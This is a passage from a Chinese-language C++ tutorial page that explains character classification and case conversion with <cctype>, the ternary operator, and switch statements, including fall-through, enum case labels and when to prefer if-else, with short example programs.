class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is uppercase alpha.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// islower(ch)</span></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is lowercase alpha.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(ch)) &#123;</span><br><span class="line">            digit_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is a digit.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">ispunct</span>(ch)) &#123;</span><br><span class="line">            punct_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is punctuation.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isspace</span>(ch)) &#123;</span><br><span class="line">            space_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; (ASCII &quot;</span> &lt;&lt; <span class="keyword">int</span>(ch) &lt;&lt; <span class="string">&quot;) is whitespace.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">iscntrl</span>(ch)) &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; (ASCII &quot;</span> &lt;&lt; <span class="keyword">int</span>(ch) &lt;&lt; <span class="string">&quot;) is a control character.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is something else.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSummary:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Alphabetic: &quot;</span> &lt;&lt; alpha_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Digits: &quot;</span> &lt;&lt; digit_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Punctuation: &quot;</span> &lt;&lt; punct_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Whitespace: &quot;</span> &lt;&lt; space_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>常用的字符转换函数:</strong></p><table><thead><tr><th align="left">函数名</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>tolower(ch)</code></td><td align="left">如果 <code>ch</code> 是大写字母，返回其对应的小写字母；否则，返回 <code>ch</code> 不变。</td></tr><tr><td align="left"><code>toupper(ch)</code></td><td align="left">如果 <code>ch</code> 是小写字母，返回其对应的大写字母；否则，返回 <code>ch</code> 不变。</td></tr></tbody></table><p><strong>用法与示例 (转换函数):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;CONVERT This Message.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lower_message = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> upper_message = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为小写</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : message) &#123;</span><br><span class="line">        lower_message += <span class="built_in">tolower</span>(ch); <span class="comment">// 将每个字符转换为小写并附加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original:  &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lowercase: &quot;</span> &lt;&lt; lower_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为大写</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : message) &#123;</span><br><span class="line">        upper_message += <span class="built_in">toupper</span>(ch); <span class="comment">// 将每个字符转换为大写并附加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Uppercase: &quot;</span> &lt;&lt; upper_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：不区分大小写的比较</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDo you want to continue? (Y/N): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">tolower</span>(response) == <span class="string">&#x27;y&#x27;</span>) &#123; <span class="comment">// 将输入转换为小写再比较</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Continuing...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Exiting...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>&lt;cctype&gt;</code> 库提供了一套标准、可移植的函数来处理字符分类和转换，这在处理用户输入、解析文本或进行不区分大小写的操作时非常有用。</p><h2 id="6-4-三元运算符"><a href="#6-4-三元运算符" class="headerlink" title="6.4 三元运算符"></a>6.4 三元运算符</h2><p>C++ 提供了一个简洁的条件运算符，称为三元运算符（或条件运算符），它是 C++ 中唯一一个需要三个操作数的运算符。它通常用于根据条件将两个值中的一个赋给变量。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>三元运算符的语法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">condition ? expression1 : expression2;</span><br></pre></td></tr></table></figure><p>其工作方式是：</p><ol><li> 首先计算 <code>condition</code>。</li><li> 如果 <code>condition</code> 为 <code>true</code>（非零），则计算 <code>expression1</code>，并且整个表达式的值就是 <code>expression1</code> 的值。</li><li> 如果 <code>condition</code> 为 <code>false</code>（零），则计算 <code>expression2</code>，并且整个表达式的值就是 <code>expression2</code> 的值。</li></ol><p>三元运算符通常可以替代简单的 <code>if else</code> 语句，使代码更紧凑。</p><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>下面是一个使用三元运算符查找两个数中较大值的示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> max_val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用三元运算符找出 a 和 b 中的较大值</span></span><br><span class="line">    max_val = (a &gt; b) ? a : b;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The maximum value between &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; max_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: The maximum value between 10 and 20 is: 20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 另一个例子：根据年龄判断是否成年</span></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">15</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> status = (age &gt;= <span class="number">18</span>) ? <span class="string">&quot;Adult&quot;</span> : <span class="string">&quot;Minor&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot;, Status: &quot;</span> &lt;&lt; status &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Age: 15, Status: Minor</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 在第一个示例中，条件 <code>(a &gt; b)</code> 被评估。因为 <code>10 &gt; 20</code> 是 <code>false</code>，所以计算第二个表达式 <code>b</code>，并将 <code>b</code> 的值（即 <code>20</code>）赋给 <code>max_val</code>。</li><li> 在第二个示例中，条件 <code>(age &gt;= 18)</code> 被评估。因为 <code>15 &gt;= 18</code> 是 <code>false</code>，所以计算第二个表达式 <code>&quot;Minor&quot;</code>，并将这个字符串赋给 <code>status</code>。</li></ol><p><strong>优点:</strong></p><ul><li>  <strong>简洁性:</strong> 可以用一行代码替代多行的 <code>if else</code> 结构，使代码更紧凑。</li></ul><p><strong>缺点:</strong></p><ul><li>  <strong>可读性:</strong> 对于复杂的条件或表达式，使用三元运算符可能会降低代码的可读性。在这种情况下，使用 <code>if else</code> 语句通常更好。</li></ul><p>三元运算符是 C++ 中一个方便的工具，尤其适用于简单的条件赋值。</p><h2 id="6-5-switch-语句"><a href="#6-5-switch-语句" class="headerlink" title="6.5 switch 语句"></a>6.5 switch 语句</h2><p><code>switch</code> 语句是 C++ 中另一种用于控制程序流程的分支结构。它允许程序根据一个表达式的值从多个代码块中选择一个来执行。<code>switch</code> 语句通常用于替代冗长的 <code>if else if else</code> 结构，特别是当判断条件基于单个变量或表达式的离散值时。</p><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><p><code>switch</code> 语句的基本语法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (expression) &#123;</span><br><span class="line">    <span class="keyword">case</span> constant_expression_1:</span><br><span class="line">        <span class="comment">// code block to be executed if expression equals constant_expression_1</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 可选，但通常需要</span></span><br><span class="line">    <span class="keyword">case</span> constant_expression_2:</span><br><span class="line">        <span class="comment">// code block to be executed if expression equals constant_expression_2</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 可选</span></span><br><span class="line">    <span class="comment">// ... 可以有更多的 case</span></span><br><span class="line">    <span class="keyword">default</span>: <span class="comment">// 可选</span></span><br><span class="line">        <span class="comment">// code block to be executed if expression doesn&#x27;t match any case</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 可选</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>工作方式:</strong></p><ol><li> 首先计算 <code>switch</code> 括号内的 <code>expression</code>（表达式）。这个表达式必须得出一个整数类型（如 <code>int</code>, <code>char</code>, <code>enum</code>）或可以隐式转换为整数类型的值。</li><li> 程序将 <code>expression</code> 的值与每个 <code>case</code> 后面跟着的 <code>constant_expression</code>（常量表达式）进行比较。</li><li> 如果找到匹配的 <code>case</code>，则执行该 <code>case</code> 标签下的代码块。</li><li> <code>break</code> 语句的作用是跳出 <code>switch</code> 结构。如果没有 <code>break</code>，程序会继续执行下一个 <code>case</code> 的代码块（称为“贯穿”），直到遇到 <code>break</code> 或 <code>switch</code> 语句结束。</li><li> <code>default</code> 标签是可选的。如果 <code>expression</code> 的值与所有 <code>case</code> 的常量表达式都不匹配，则执行 <code>default</code> 标签下的代码块。如果没有 <code>default</code> 标签且没有匹配的 <code>case</code>，则 <code>switch</code> 语句不执行任何操作。</li></ol><p><strong>重要限制:</strong></p><ul><li>  <code>case</code> 标签后面的值必须是常量表达式（如字面值 <code>10</code>、<code>&#39;A&#39;</code> 或 <code>const</code> 整数变量，或者枚举量）。不能是变量或非常量表达式。</li><li>  <code>expression</code> 的结果必须是整数类型（<code>int</code>, <code>char</code>, <code>short</code>, <code>long</code>, <code>long long</code>, <code>bool</code>, <code>enum</code> 等）。不能是浮点数 (<code>float</code>, <code>double</code>) 或字符串 (<code>std::string</code>)。</li></ul><h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number (1-3): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 跳出 switch</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 2.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 跳出 switch</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 3.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 跳出 switch</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid choice.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// default 后面通常也放 break，虽然在这里不是必需的，但保持一致性是好习惯</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示没有 break 的情况 (贯穿)</span></span><br><span class="line">    <span class="keyword">char</span> grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nGrade example (fall-through):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">switch</span> (grade) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Excellent! &quot;</span>;</span><br><span class="line">            <span class="comment">// 没有 break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Good! &quot;</span>;</span><br><span class="line">            <span class="comment">// 没有 break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Passing. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 在这里跳出</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>: <span class="comment">// 可以将多个 case 关联到同一代码块</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Needs improvement. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid grade. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Good! Passing.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 第一个 <code>switch</code> 根据用户输入的 <code>choice</code> 值执行相应的 <code>case</code>。<code>break</code> 语句确保只执行匹配 <code>case</code> 的代码。如果输入不是 1、2 或 3，则执行 <code>default</code> 部分。</li><li> 第二个 <code>switch</code> 演示了“贯穿”行为。因为 <code>case &#39;A&#39;</code> 和 <code>case &#39;B&#39;</code> 后面没有 <code>break</code>，当 <code>grade</code> 为 <code>&#39;B&#39;</code> 时，程序会执行 <code>case &#39;B&#39;</code> 的代码 (<code>std::cout &lt;&lt; &quot;Good! &quot;;</code>)，然后继续执行 <code>case &#39;C&#39;</code> 的代码 (<code>std::cout &lt;&lt; &quot;Passing. &quot;;</code>)，直到遇到 <code>case &#39;C&#39;</code> 中的 <code>break</code> 才跳出 <code>switch</code>。同时，它也展示了如何将多个 <code>case</code>（<code>&#39;D&#39;</code> 和 <code>&#39;F&#39;</code>）关联到同一个代码块。</li></ol><h3 id="6-5-1-将枚举量用作标签"><a href="#6-5-1-将枚举量用作标签" class="headerlink" title="6.5.1 将枚举量用作标签"></a>6.5.1 将枚举量用作标签</h3><p>枚举 (<code>enum</code>) 类型的值是整数常量，因此非常适合用作 <code>switch</code> 语句的 <code>case</code> 标签，这可以提高代码的可读性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个枚举类型表示颜色</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Color</span> &#123;</span> RED, GREEN, BLUE, YELLOW &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color selectedColor = GREEN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (selectedColor) &#123;</span><br><span class="line">        <span class="keyword">case</span> RED:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Red.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> GREEN:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 这将被执行</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BLUE:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Blue.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 注意：如果 case 覆盖了所有枚举量，可以省略 default，</span></span><br><span class="line">        <span class="comment">// 但如果枚举可能扩展，或者你想处理无效值，最好加上 default。</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unknown color.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用枚举量作为 <code>case</code> 标签比直接使用魔法数字（如 0, 1, 2）更清晰易懂。</p><h3 id="6-5-2-switch-和-if-else"><a href="#6-5-2-switch-和-if-else" class="headerlink" title="6.5.2 switch 和 if else"></a>6.5.2 switch 和 if else</h3><p><code>switch</code> 语句可以看作是特定类型的 <code>if else if else</code> 结构的替代品，即判断条件都基于同一个整数表达式的值。</p><p><strong>何时使用 <code>switch</code>:</strong></p><ul><li>  当需要根据单个整数表达式的多个<strong>特定离散值</strong>进行分支时。</li><li>  当分支逻辑清晰，可以提高可读性时。</li></ul><p><strong>何时使用 <code>if else if else</code>:</strong></p><ul><li>  当判断条件涉及<strong>范围</strong>（例如 <code>age &gt; 18 &amp;&amp; age &lt; 60</code>）时。</li><li>  当判断条件涉及<strong>浮点数</strong>或<strong>字符串</strong>比较时。</li><li>  当判断条件比较复杂，涉及多个不同变量或逻辑运算时。</li><li>  当只有一个或两个分支时，<code>if else</code> 可能更简洁。</li></ul><p><strong>示例比较:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 if else if</span></span><br><span class="line"><span class="keyword">int</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;One&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Two&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 执行</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Three&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Other&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 switch 